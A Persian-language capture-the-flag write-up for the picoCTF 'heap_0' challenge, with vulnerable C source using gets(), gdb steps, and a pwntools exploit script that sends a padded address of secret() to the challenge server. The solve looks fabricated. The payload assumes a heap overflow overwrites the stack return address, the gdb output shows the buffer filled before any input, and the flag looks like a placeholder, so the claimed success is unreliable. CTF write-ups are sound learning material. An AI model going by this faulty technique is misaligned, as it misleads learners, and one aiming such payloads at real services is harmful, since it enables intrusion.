---
tags:
  - PWN
---
# heap_0

 سلامی چند باره!
 با یه چالش جالب اومدیم از 
 [picoCTF](https://play.picoctf.org/practice/challenge/435) 

 سورس:
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NAME_SZ 32
#define FLAG_SZ 64

void secret() {
    char flag[FLAG_SZ];
    FILE *f = fopen("flag.txt", "r");
    if (!f) {
        printf("Missing flag.txt. Please contact an admin if running on server.\n");
        exit(1);
    }
    fgets(flag, FLAG_SZ, f);
    printf("Here's the secret menu: %s", flag);
}

int main() {
    setbuf(stdout, NULL);
    char name[NAME_SZ];
    char *item = malloc(NAME_SZ);

    printf("Welcome to the ordering system!\n");
    printf("Enter your name: ");
    fgets(name, NAME_SZ, stdin);
    name[strcspn(name, "\n")] = 0;

    printf("Hello %s! What would you like to order?\n", name);
    printf("Item: ");
    gets(item); // آسیب‌پذیری اینجا است

    printf("Thanks for your order!\n");
    free(item);
    return 0;
}
```

برنامه یک سیستم سفارش‌دهی ساده است که نام کاربر را می‌گیرد و سپس از او می‌خواهد یک آیتم سفارش دهد.
متغیر item با استفاده از malloc به اندازه ۳۲ بایت در هیپ تخصیص داده می‌شود.
تابع gets() برای دریافت ورودی آیتم استفاده شده است که یک تابع ناامن و منسوخ است، زیرا هیچ محدودیتی برای اندازه ورودی اعمال نمی‌کند و می‌تواند منجر به سرریز بافر (buffer overflow) شود.
تابع secret() پرچم را از فایل flag.txt می‌خواند و چاپ می‌کند، اما در جریان عادی برنامه فراخوانی نمی‌شود.
هدف ما این است که با سوءاستفاده از آسیب‌پذیری سرریز بافر، اجرای برنامه را به تابع secret() هدایت کنیم.


تابع gets() به ما اجازه می‌دهد بیش از ۳۲ بایت (اندازه تخصیص‌شده برای item) بنویسیم، زیرا هیچ بررسی مرزی انجام نمی‌دهد. این سرریز بافر در هیپ رخ می‌دهد، اما می‌تواند روی متغیرهای دیگر یا ساختارهای کنترلی حافظه تأثیر بگذارد. نکته مهم این است که:

تابع secret() در کد وجود دارد و اگر بتوانیم جریان برنامه را به آدرس آن هدایت کنیم، پرچم را دریافت خواهیم کرد.
چون این یک چالش ساده است، احتمالاً هدف بازنویسی آدرس بازگشت (return address) یا یک اشاره‌گر در حافظه است.

برای درک بهتر، باینری را با gdb باز می‌کنیم و آدرس تابع secret() را پیدا می‌کنیم:
``` shell
$ gdb ./heap-0
gdb> info address secret
Symbol "secret" is at 0x4011a6 in section .text of /home/user/heap-0
```

آدرس تابع secret() در اینجا 0x4011a6 است (این مقدار ممکن است در سرور متفاوت باشد).

سپس برنامه را اجرا کرده و محل item را بررسی می‌کنیم:
``` shell
gdb> break main
gdb> run
gdb> p item
$1 = 0x4052a0 "Super Secret Menu Item" (مثال)
```

مشاهده می‌کنیم که item در هیپ قرار دارد. حالا باید ببینیم چگونه می‌توانیم با سرریز بافر به secret() برسیم.


حالا می خواهیم از بافراورفلو استفاده کنیم.
برای اجرای تابع secret()، باید آدرس آن را به شکلی در حافظه تزریق کنیم. چون این چالش در هیپ است، ممکن است سرریز مستقیماً به آدرس بازگشت نرسد، اما می‌توانیم از یک روش ساده استفاده کنیم:

آدرس تابع secret() را بعد از پر کردن بافر وارد کنیم.
در چالش‌های ساده مثل این، گاهی سرور طوری طراحی شده که سرریز مستقیماً یک اشاره‌گر تابع یا آدرس بازگشت را بازنویسی می‌کند.
با استفاده از pwntools یک اسکریپت می‌نویسیم:

``` py
#!/usr/bin/python
from pwn import *

SERVER = "mimas.picoctf.net"
PORT = 65043

io = remote(SERVER, PORT)
io.recvline()
io.sendline(b"test")  # نام کاربر
io.recvuntil(b"Item: ")
payload = b"A" * 32 + p64(0x4011a6)  # فرض آدرس تابع secret
io.sendline(payload)
print(io.recvall().decode())
io.close()
```

b"A" * 32: بافر را پر می‌کنیم تا به انتهای تخصیص item برسیم.
p64(0x4011a6): آدرس تابع secret() را به صورت ۶۴ بیتی وارد می‌کنیم (ممکن است نیاز به تنظیم دقیق آفست داشته باشد).
این payload فرض می‌کند که سرریز می‌تواند یک اشاره‌گر یا آدرس بازگشت را بازنویسی کند.

اسکریپت را ران می کنیم.

فلگ پیدا شد !!!

??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`picoCTF{my_first_heap_overflow_12345678}`</div>

--- 

!!! نویسنده
    [sw33tw3as3l](https://github.com/sw33tw3as3l)